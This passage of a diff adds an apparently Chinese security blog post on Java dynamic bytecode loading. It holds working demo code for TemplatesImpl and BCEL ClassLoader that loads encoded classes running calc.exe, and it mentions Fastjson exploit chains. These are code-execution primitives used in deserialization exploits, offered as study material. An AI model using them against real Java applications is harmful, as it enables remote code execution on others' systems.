+或者用另一条链也行</p>
+<pre><code>TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()-&gt;TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()  
+
+</code></pre>
+<pre><code>package org.hh;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.Properties;
+
+//import static com.sun.beans.decoder.FieldElementHandler.setFieldValue;
+
+public class TemplatesImplDemo {
+   public static void main(String[] args) throws Exception {
+       String exp = &quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygp\n&quot; +
+               &quot;VgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJh\n&quot; +
+               &quot;bnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNs\n&quot; +
+               &quot;dGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxp\n&quot; +
+               &quot;emVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9h\n&quot; +
+               &quot;cGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFj\n&quot; +
+               &quot;aGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3Jn\n&quot; +
+               &quot;L2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu\n&quot; +
+               &quot;ZGxlcjspVgEAClNvdXJjZUZpbGUBABNUZW1wbGF0ZXNIZWxsby5qYXZhDAAHAAgH\n&quot; +
+               &quot;ABwMAB0AHgEABGNhbGMMAB8AIAEADlRlbXBsYXRlc0hlbGxvAQBAY29tL3N1bi9v\n&quot; +
+               &quot;cmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RU\n&quot; +
+               &quot;cmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFj\n&quot; +
+               &quot;aGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZh\n&quot; +
+               &quot;L2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGlt\n&quot; +
+               &quot;ZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nl\n&quot; +
+               &quot;c3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YA\n&quot; +
+               &quot;BFexAAAAAQAKAAAADgADAAAACgAEAAsADQAMAAsAAAAEAAEADAABAA0ADgACAAkA\n&quot; +
+               &quot;AAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEAALAAAABAABAA8AAQANABAAAgAJ\n&quot; +
+               &quot;AAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABUACwAAAAQAAQAPAAEAEQAAAAIA\n&quot; +
+               &quot;Eg==&quot;;
+       exp = exp.replaceAll(&quot;\n&quot;,&quot;&quot;);
+       //System.out.println(exp);
+       byte[] code = Base64.getDecoder().decode(exp);
+       TemplatesImpl templatesImpl =  new TemplatesImpl();
+       setFieldValue(&quot;_name&quot;, &quot;TemplatesHello&quot;, templatesImpl);
+       setFieldValue(&quot;_bytecodes&quot;, new byte[][]{code}, templatesImpl);
+       setFieldValue(&quot;_outputProperties&quot;, new Properties(), templatesImpl);
+       setFieldValue(&quot;_indentNumber&quot;, 0, templatesImpl);
+       setFieldValue(&quot;_tfactory&quot;, new TransformerFactoryImpl(), templatesImpl);
+       templatesImpl.newTransformer();
+       //templatesImpl.getOutputProperties();
+   }
+   public static void setFieldValue(String name, Object value, Object obj) throws Exception{
+       Field f = obj.getClass().getDeclaredField(name);
+       f.setAccessible(true);
+       f.set(obj, value);
+   }
+}
+</code></pre>
+<p>其中， setFieldValue 方法用来设置私有属性。_bytecodes 是由字节码组成的数组； _name 可以是任意字符串，只要不为null即可；_tfactory 需要是一个TransformerFactoryImpl 对象，因为TemplatesImpl#defineTransletClasses() 方法里有调用到_tfactory.getExternalExtensionsMap() ，如果是null会出错。</p>
+<p>测试的时候发现 _outputProperties 和 _indentNumber 不用设置也能弹出计算器</p>
+<h2 id="bcel-classloader">BCEL ClassLoader</h2>
+<p>关于 BCEL 的介绍这里就不写了, 我们主要利用的是 BCEL 中的 com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass, 该方法接收一个 String, 并判断是否以 $$BCEL$$ 开头, 然后将其后面的字符串解析成 Java 字节码, 最终加载 class<br>
+在 BCEL 中有两个工具类 Repository 和 Utility, Repository 用于将 Class 对象转换成原生字节码 (与 javac 编译的 class 内容一致), 而 Utility 用于将原生字节码转换成 BCEL 格式的字节码 (转换过程中还会存在 gzip 压缩)<br>
+需要注意的是在 Java 8u251 中, Oracle 移除了 com.sun.org.apache.bcel.internal.util.ClassLoader, 并且用 Repository 和 Utility 在开启 gzip 压缩的情况下生成的 BCEL 字节码也会出现问题, 建议使用 8u251 以下的 Java 8, 或者使用 Java 7 等更低版本<br>
+这里我用的是 Java 8u131<br>
+先编写被加载的类</p>
+<pre><code>package org.hh.BCEL;
+
+public class Hello {
+    public Hello(){
+        try {
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        } catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>生成对应的 BCEL 格式的字节码</p>
+<pre><code>package org.hh.BCEL;
+
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+
+import java.io.IOException;
+
+public class echoBCEL {
+    public static void main(String[] args) throws IOException {
+        JavaClass cls= Repository.lookupClass(Hello.class);
+        String code = Utility.encode(cls.getBytes(),true);
+        System.out.println(code);
+    }
+}
+</code></pre>
+<p>最后通过 com.sun.org.apache.bcel.internal.util.ClassLoader 加载 class</p>
+<pre><code>package org.hh.BCEL;
+
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+import com.sun.org.apache.bcel.internal.util.ClassLoader;
+
+
+import java.io.IOException;
+
+public class BCELDemo {
+    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException {
+
+        String code = &quot;$l$8b$I$A$A$A$A$A$A$AmQ$cbN$h1$U$3dN$a6$990L$c8$83$86R$5e$a5$_$IEb6$ec$a8X$80$a8$ba$Y$k$o$88$ae$jc$r$a6$c3L4q$Q$L$fe$a7$ebn$a0$ea$82$P$e0$a3$80$e3$a8$C$qj$cb$d7$3a$f7$9e$7b$ee$bd$f6$ed$dd$df$h$A$ebX$KP$c6$9b$A$d3x$5b$c6$8c$bbg$7d$cc$Fx$85y$l$L$3e$de$J$94$be$9a$d4$d8M$81bk$e5X$c0$db$ceN$b4$4056$a9$de$h$9eut$7e$q$3b$J$3d$8d8S29$96$b9q$f8$9fS$f04$e3Sy$$$a3D$a6$ddh$e7B$e9$be5Y$baA$r$db3$D$81$c98$cb$bbQ$af$Xmm$ef$c4$d1w$9d$q$Z$83$95$b6$95$ea$e7$ae$ec$8f$84F$bd$cc$J$E$edl$98$x$fd$cd8$ed$60$c4$5ds$e2$n$c6$Q$f8X$M$f1$k$l$E$calD$ad$e9$L$j$e2$p$3e$b1$c4$7f$g$I$f1$Z$81$40$fdEq$81$da$T$7d$bfs$aa$95$r$ed$c9u8L$ad9s$f5$bb$da$3e$82fk$r$7e$c1qC$b2$L$r$b0$dcz$Wm$db$dc$a4$dd$8d$e7$J$Hy$a6$f4$60$c0$84j$9fA$3b$9a$fe$u$97Js$o$9f$7f$e4$W$9f$d3$cdI$3bNt$89$C70$f5$e5$g$e2$P$K$8d$e2$V$bc$l$bfP$8eW$afP$faM$96$87$Kj$fc$ca$oB$f2fP$a2$f5$b8K$f4$8f1$e2$a3N$e5$s$V$xN$87juF$tPe$ae$c35b$a0$c1SC$e1$9eF$f8$98t$e6$b5GF$93$fe$C$a6$k$A$G$bb$K$a4K$C$A$A\n&quot;;
+        //这里用的是BCEL的ClassLoader
+        ClassLoader loader = new ClassLoader();
+        Class clazz = loader.loadClass(&quot;$$BCEL$$&quot;+code);
+
+    	//反射触发构造函数中的恶意代码
+        clazz.newInstance();
+        //new ClassLoader().loadClass(&quot;$$BCEL$$&quot; + code).newInstance();
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://ret2hh.github.io//post-images/1668482251952.png" alt="" loading="lazy"></figure>
+<p>BCEL ClassLoader在Fastjson等漏洞的利用链构造时都有被用到，其实这个类和前面的TemplatesImpl 都出自于同一个第三方库，Apache Xalan。但是由于各种原因，在Java 8u251的更新中，这个ClassLoader被移除了，所以之后只能且用且珍惜了。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AD%97%E8%8A%82%E7%A0%81">什么是字节码</a></li>
+<li><a href="#classloader%E5%8E%9F%E7%90%86">ClassLoader原理</a>
+<ul>
+<li><a href="#classloader-%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86">ClassLoader 基本知识</a>
+<ul>
+<li><a href="#%E7%88%B6%E5%AD%90%E5%85%B3%E7%B3%BB">父子关系</a></li>
+<li><a href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB">继承关系</a></li>
+<li><a href="#classloader%E7%9A%84%E9%87%8D%E8%A6%81%E6%96%B9%E6%B3%95">ClassLoader的重要方法</a></li>
+</ul>
+</li>
+<li><a href="#classloader-%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B-%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6">ClassLoader 加载流程 (双亲委派机制)</a></li>
+<li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89-classloader">自定义 ClassLoader</a></li>
+</ul>
+</li>
+<li><a href="#%E5%88%A9%E7%94%A8-classloader-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81">利用 ClassLoader 动态加载字节码</a>
+<ul>
+<li><a href="#urlclassloader">URLClassLoader</a>
+<ul>
+<li><a href="#%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8Bclass">加载远程class</a></li>
+<li><a href="#%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8Bjar%E5%8C%85">加载远程jar包</a></li>
+</ul>
+</li>
+<li><a href="#classloaderdefineclass">ClassLoader#defineClass</a></li>
+<li><a href="#templatesimpl">TemplatesImpl</a></li>
+<li><a href="#bcel-classloader">BCEL ClassLoader</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ret2hh.github.io/post/jndi-zhu-ru/">
+              <h3 class="post-title">
+                JNDI注入
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  easy money sniper
+  <a class="rss" href="https://ret2hh.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
